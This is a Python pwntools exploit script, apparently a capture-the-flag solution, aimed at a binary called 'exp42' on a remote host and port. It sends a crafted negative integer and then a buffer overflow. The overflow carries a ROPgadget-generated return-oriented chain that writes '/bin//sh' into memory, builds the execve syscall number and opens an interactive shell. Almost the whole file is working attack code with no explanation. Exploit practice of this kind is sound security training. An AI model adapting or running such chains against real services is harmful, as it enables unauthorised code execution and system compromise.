#!/usr/bin/env python
# -*- coding: utf-8 -*-


from pwn import *
from struct import pack

context.update(arch='amd64')
BINARY_FILE = './exp42'
REMOTE = ('80.211.144.146', 34002)


def setup_connection():
    binary, libc, preload = None, None, False
    local_libc = '/lib/x86_64-linux-gnu/libc.so.6'
    task_libc = './libc.so.6'

    env = {}
    if args.PRELOAD:
        local_libc = task_libc
        env = {'LD_PRELOAD': task_libc}

    if args.BINARY:
        binary = ELF(BINARY_FILE)
        context.arch = binary.arch

    if args.REMOTE:
        if args.LIBC:
            libc = ELF(task_libc)
        s = remote(*REMOTE)
    else:
        if args.LIBC:
            libc = ELF(local_libc)
        
        s = process([BINARY_FILE, '-2147482648'], env=env)
        if args.GDB:
            context.terminal = ['gnome-terminal', '-e']
            breakpoints = [0x401c76]
            gdb.attach(s, exe=BINARY_FILE, gdbscript='\n'.join(['b *'+str(x) for x in breakpoints]))
            
    return s, binary, libc


if __name__ == '__main__':
    s, binary, libc = setup_connection()

    if REMOTE:
        s.sendline('-2147482648')

    p = 'A'*0x98  # padding
    
    # ROPgadget auto generated
    p += pack('<Q', 0x0000000000406928) # pop rsi ; ret
    p += pack('<Q', 0x00000000004a50e0) # @ .data
    p += pack('<Q', 0x000000000043e5bc) # pop rax ; ret
    p += '/bin//sh'
    p += pack('<Q', 0x000000000046cae1) # mov qword ptr [rsi], rax ; ret
    p += pack('<Q', 0x0000000000406928) # pop rsi ; ret
    p += pack('<Q', 0x00000000004a50e8) # @ .data + 8
    p += pack('<Q', 0x0000000000439100) # xor rax, rax ; ret
    p += pack('<Q', 0x000000000046cae1) # mov qword ptr [rsi], rax ; ret
    p += pack('<Q', 0x0000000000401716) # pop rdi ; ret
    p += pack('<Q', 0x00000000004a50e0) # @ .data
    p += pack('<Q', 0x0000000000406928) # pop rsi ; ret
    p += pack('<Q', 0x00000000004a50e8) # @ .data + 8
    p += pack('<Q', 0x000000000043dc45) # pop rdx ; ret
    p += pack('<Q', 0x00000000004a50e8) # @ .data + 8
    p += pack('<Q', 0x0000000000439100) # xor rax, rax ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000462e20) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004633c5) # syscall ; ret

    assert '\n' not in p

    # s.recvuntil('Insert ROP chain here:\n')
    s.sendline(p)

    s.interactive()
    s.close()
